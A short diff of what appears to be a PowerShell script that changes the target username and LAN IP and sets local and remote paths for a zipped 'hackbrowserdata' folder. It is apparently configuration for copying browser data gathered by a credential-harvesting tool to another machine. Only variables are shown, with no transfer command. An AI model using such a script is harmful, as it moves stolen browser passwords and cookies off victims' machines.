@@ -1,6 +1,6 @@
 # Variables
-$serverUser = "DELL"
-$serverIP = "192.168.0.117"  # IP du premier PC
+$serverUser = "123"
+$serverIP = "192.168.0.54"  # IP du premier PC
 $destDir = "/home/$serverUser/hackbrowserdata"
 $localPath = "$env:USERPROFILE\hackbrowserdata"
 $zipPath = "$localPath\hackbrowserdata.zip"
